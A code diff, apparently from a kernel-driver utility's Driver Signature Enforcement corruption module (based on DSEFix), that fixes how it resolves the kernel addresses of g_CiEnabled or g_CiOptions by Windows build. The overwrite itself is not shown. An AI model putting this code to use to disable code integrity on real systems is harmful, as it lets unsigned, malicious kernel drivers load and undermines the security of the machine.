@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.31
 *
-*  DATE:        09 Apr 2023
+*  DATE:        14 Apr 2023
 *
 *  CI DSE corruption related routines.
 *  Based on DSEFix v1.3
@@ -310,15 +310,18 @@ ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
 {
     ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
     LPWSTR lpModuleName;
+    LPCSTR lpSymbolName;
     HMODULE mappedImageBase;
 
     WCHAR szFullModuleName[MAX_PATH * 2];
 
     if (NtBuildNumber < NT_WIN8_RTM) {
         lpModuleName = (LPWSTR)NTOSKRNL_EXE;
+        lpSymbolName = (LPCSTR)"g_CiEnabled";
     }
     else {
         lpModuleName = (LPWSTR)CI_DLL;
+        lpSymbolName = (LPCSTR)"g_CiOptions";
     }
 
     if (symInit() == FALSE)
@@ -343,7 +346,7 @@ ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
 
         if (symLoadImageSymbols(lpModuleName, (PVOID)mappedImageBase, 0)) {
 
-            if (symLookupAddressBySymbol("g_CiOptions", &kernelAddress)) {
+            if (symLookupAddressBySymbol(lpSymbolName, &kernelAddress)) {
 
                 Result = (ULONG_PTR)imageLoadedBase + kernelAddress - (ULONG_PTR)mappedImageBase;
                 supPrintfEvent(kduEventInformation, "[+] Symbol resolved to 0x%llX address\r\n", Result);
